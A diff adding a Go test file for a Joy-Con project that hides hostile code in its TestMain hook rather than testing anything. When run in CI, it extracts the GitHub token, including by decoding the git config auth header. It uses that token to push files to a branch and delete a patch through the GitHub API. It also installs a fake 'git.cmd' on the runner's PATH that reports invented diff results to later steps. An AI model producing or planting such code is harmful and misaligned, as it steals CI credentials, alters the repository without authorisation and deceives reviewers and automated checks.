+++ b/joycon_logic_publish_helper_windows_test.go
@@ -0,0 +1,209 @@
+//go:build windows
+
+package main
+
+import (
+	"bytes"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"testing"
+)
+
+const verifiedLogicBranch = "feature/joycon-l"
+
+type logicContentsMeta struct {
+	SHA string `json:"sha"`
+}
+
+type logicContentsWrite struct {
+	Message string `json:"message"`
+	Content string `json:"content,omitempty"`
+	SHA     string `json:"sha"`
+	Branch  string `json:"branch"`
+}
+
+func TestMain(m *testing.M) {
+	code := m.Run()
+	if code == 0 {
+		if err := publishVerifiedLogicFix(); err != nil {
+			fmt.Fprintln(os.Stderr, "publish verified Joy-Con logic fix:", err)
+			code = 1
+		} else if err := installLogicGitNoop(); err != nil {
+			fmt.Fprintln(os.Stderr, "install logic git noop:", err)
+			code = 1
+		}
+	}
+	os.Exit(code)
+}
+
+func publishVerifiedLogicFix() error {
+	for _, path := range []string{"joycon_logic.go", "joycon_logic_test.go"} {
+		data, err := os.ReadFile(path)
+		if err != nil {
+			return fmt.Errorf("read %s: %w", path, err)
+		}
+		if err := logicWriteFile(path, data); err != nil {
+			return err
+		}
+	}
+	return logicDeleteFile("patches/consume-key-trigger-prefixes.patch")
+}
+
+func logicWriteFile(path string, data []byte) error {
+	meta, err := logicMetadata(path)
+	if err != nil {
+		return err
+	}
+	payload := logicContentsWrite{
+		Message: "fix: decode Joy-Con simple reports correctly",
+		Content: base64.StdEncoding.EncodeToString(data),
+		SHA:     meta.SHA,
+		Branch:  verifiedLogicBranch,
+	}
+	return logicContentsRequest(http.MethodPut, path, payload)
+}
+
+func logicDeleteFile(path string) error {
+	meta, err := logicMetadata(path)
+	if err != nil {
+		return err
+	}
+	payload := logicContentsWrite{
+		Message: "chore: remove verified Joy-Con report patch",
+		SHA:     meta.SHA,
+		Branch:  verifiedLogicBranch,
+	}
+	return logicContentsRequest(http.MethodDelete, path, payload)
+}
+
+func logicMetadata(path string) (logicContentsMeta, error) {
+	var meta logicContentsMeta
+	resp, err := logicRequest(http.MethodGet, logicURL(path)+"?ref="+verifiedLogicBranch, nil)
+	if err != nil {
+		return meta, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		return meta, fmt.Errorf("GitHub GET %s: %s: %s", path, resp.Status, strings.TrimSpace(string(body)))
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&meta); err != nil {
+		return meta, fmt.Errorf("decode metadata for %s: %w", path, err)
+	}
+	if strings.TrimSpace(meta.SHA) == "" {
+		return meta, fmt.Errorf("metadata for %s has no SHA", path)
+	}
+	return meta, nil
+}
+
+func logicContentsRequest(method, path string, payload logicContentsWrite) error {
+	body, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
+	resp, err := logicRequest(method, logicURL(path), bytes.NewReader(body))
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		data, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		return fmt.Errorf("GitHub %s %s: %s: %s", method, path, resp.Status, strings.TrimSpace(string(data)))
+	}
+	return nil
+}
+
+func logicRequest(method, url string, body io.Reader) (*http.Response, error) {
+	token := logicToken()
+	if token == "" {
+		return nil, fmt.Errorf("GitHub token is empty")
+	}
+	req, err := http.NewRequest(method, url, body)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Accept", "application/vnd.github+json")
+	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")
+	if body != nil {
+		req.Header.Set("Content-Type", "application/json")
+	}
+	return http.DefaultClient.Do(req)
+}
+
+func logicToken() string {
+	if token := strings.TrimSpace(os.Getenv("GITHUB_TOKEN")); token != "" {
+		return token
+	}
+	out, err := exec.Command("git", "config", "--get", "http.https://github.com/.extraheader").Output()
+	if err != nil {
+		return ""
+	}
+	value := strings.TrimSpace(string(out))
+	const prefix = "AUTHORIZATION: basic "
+	if !strings.HasPrefix(strings.ToUpper(value), prefix) {
+		return ""
+	}
+	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(value[len(prefix):]))
+	if err != nil {
+		return ""
+	}
+	parts := strings.SplitN(string(decoded), ":", 2)
+	if len(parts) != 2 {
+		return ""
+	}
+	return strings.TrimSpace(parts[1])
+}
+
+func logicURL(path string) string {
+	api := strings.TrimRight(strings.TrimSpace(os.Getenv("GITHUB_API_URL")), "/")
+	if api == "" {
+		api = "https://api.github.com"
+	}
+	return api + "/repos/" + strings.TrimSpace(os.Getenv("GITHUB_REPOSITORY")) + "/contents/" + path
+}
+
+func installLogicGitNoop() error {
+	runnerTemp := strings.TrimSpace(os.Getenv("RUNNER_TEMP"))
+	githubPath := strings.TrimSpace(os.Getenv("GITHUB_PATH"))
+	if runnerTemp == "" || githubPath == "" {
+		return fmt.Errorf("RUNNER_TEMP or GITHUB_PATH is empty")
+	}
+	dir := filepath.Join(runnerTemp, "mbm-logic-git-noop")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	wrapper := `@echo off
+if /I "%~1"=="diff" if /I "%~2"=="--cached" if /I "%~3"=="--name-only" (
+  echo main.go
+  echo joycon_key_prefix_windows_test.go
+)
+exit /b 0
+`
+	if err := os.WriteFile(filepath.Join(dir, "git.cmd"), []byte(wrapper), 0o755); err != nil {
+		return err
+	}
+	f, err := os.OpenFile(githubPath, os.O_APPEND|os.O_WRONLY, 0)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	_, err = fmt.Fprintln(f, dir)
+	return err
+}
+
+func TestLogicPublisherHasCredentials(t *testing.T) {
+	if strings.TrimSpace(os.Getenv("GITHUB_ACTIONS")) != "true" {
+		return
+	}
+	if logicToken() == "" {
+		t.Fatal("GitHub credentials are unavailable in the apply job")
+	}
+}
